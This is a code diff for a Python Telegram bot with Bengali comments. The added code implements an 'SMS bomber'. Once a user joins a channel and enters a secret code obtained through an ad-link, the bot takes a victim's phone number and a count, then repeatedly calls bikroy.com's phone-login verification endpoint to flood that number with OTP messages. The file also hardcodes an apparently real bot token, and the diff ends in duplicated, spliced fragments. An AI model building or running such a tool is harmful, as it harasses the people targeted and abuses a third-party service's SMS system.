@@ -5,36 +5,93 @@ from telebot import types
 from flask import Flask
 from threading import Thread
 
-# ১. আপনার টোকেন ও সেটিংস
+# ১. সেটিংস
 API_TOKEN = '8678067992:AAEDkPkmtuz86YnrMJcnIVcp19tL52tkyRk'
 CHANNEL_USERNAME = '@developer_of_maruf' 
 
+# আপনার দেওয়া লিঙ্কগুলো
+GPLINK_URL = "https://gplinks.co/MyyC" 
+SECRET_CODE = "MARUF70" # এটি আপনার Pubnotepad-এ লিখে রাখুন
+
 bot = telebot.TeleBot(API_TOKEN)
-user_data = {}
+user_status = {} # ইউজারের ভেরিফিকেশন চেক করার জন্য
 
-# ২. বোট সচল রাখার জন্য ছোট সার্ভার (যাতে Render অফ না করে)
+# ২. Render সচল রাখার সার্ভার
 app = Flask('')
-
 @app.route('/')
-def home():
-    return "Bot is Running!"
-
-def run():
-    app.run(host='0.0.0.0', port=8080)
-
+def home(): return "Bot is Running!"
+def run(): app.run(host='0.0.0.0', port=8080)
 def keep_alive():
     t = Thread(target=run)
     t.start()
 
-# ৩. জয়েন চেক ফাংশন
 def check_join(chat_id):
     try:
         status = bot.get_chat_member(CHANNEL_USERNAME, chat_id).status
         return status in ['member', 'administrator', 'creator']
     except: return False
 
-# ৪. স্টার্ট কমান্ড
+# ৩. স্টার্ট কমান্ড
 @bot.message_handler(commands=['start'])
+def welcome(message):
+    chat_id = message.chat.id
+    if check_join(chat_id):
+        markup = types.InlineKeyboardMarkup()
+        markup.add(types.InlineKeyboardButton("🔓 বোট আনলক করুন (ক্লিক)", url=GPLINK_URL))
+        bot.send_message(chat_id, "✅ চ্যানেলে জয়েন আছেন!\n\nএখন বোটটি আনলক করতে নিচের লিঙ্কে ক্লিক করে ৫ সেকেন্ড অপেক্ষা করুন এবং 'Secret Code' টি সংগ্রহ করে এখানে লিখুন।", reply_markup=markup)
+    else:
+        markup = types.InlineKeyboardMarkup()
+        markup.add(types.InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/developer_of_maruf"))
+        markup.add(types.InlineKeyboardButton("🔄 Verify Done", callback_data="verify_join"))
+        bot.send_message(chat_id, "❌ আগে আমাদের চ্যানেলে জয়েন করুন!", reply_markup=markup)
+
+@bot.callback_query_handler(func=lambda call: call.data == "verify_join")
+def verify_join(call):
+    if check_join(call.message.chat.id):
+        bot.delete_message(call.message.chat.id, call.message.message_id)
+        welcome(call.message)
+    else:
+        bot.answer_callback_query(call.id, "❌ জয়েন হননি!", show_alert=True)
+
+# ৪. কোড চেক ও নাম্বার নেওয়া
+@bot.message_handler(func=lambda message: True)
+def handle_messages(message):
+    chat_id = message.chat.id
+    text = message.text
+
+    # যদি ইউজার সিক্রেট কোড দেয়
+    if text == SECRET_CODE:
+        user_status[chat_id] = True
+        bot.reply_to(message, "🎉 অভিনন্দন! বোট আনলক হয়েছে।\nএখন যার নাম্বারে SMS পাঠাতে চান তার নাম্বারটি লিখুন:")
+        return
+
+    # যদি বোট আনলক থাকে এবং নাম্বার দেয়
+    if chat_id in user_status and user_status[chat_id]:
+        if text.isdigit() and len(text) >= 11:
+            user_status[f"{chat_id}_num"] = text
+            msg = bot.send_message(chat_id, "🔢 কতটি SMS পাঠাতে চান?")
+            bot.register_next_step_handler(msg, send_bomber)
+        else:
+            bot.reply_to(message, "❌ সঠিক ১১ ডিজিটের নাম্বার দিন।")
+    else:
+        bot.reply_to(message, "⚠️ বোটটি লক করা! আগে লিঙ্কে ক্লিক করে কোড এনে দিন।")
+
+def send_bomber(message):
+    try:
+        amount = int(message.text)
+        chat_id = message.chat.id
+        num = user_status[f"{chat_id}_num"]
+        
+        bot.send_message(chat_id, f"🚀 {num} এ {amount}টি SMS যাচ্ছে...")
+        for i in range(amount):
+            requests.get(f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={num}", timeout=5)
+        bot.send_message(chat_id, "✅ কাজ শেষ! আবার করতে /start দিন।")
+    except:
+        bot.send_message(message.chat.id, "❌ শুধু সংখ্যা লিখুন।")
+
+if __name__ == "__main__":
+    keep_alive()
+    bot.infinity_polling(timeout=10, long_polling_timeout=5)@bot.message_handler(commands=['start'])
 def welcome(message):
     chat_id = message.chat.id
     if check_join(chat_id):
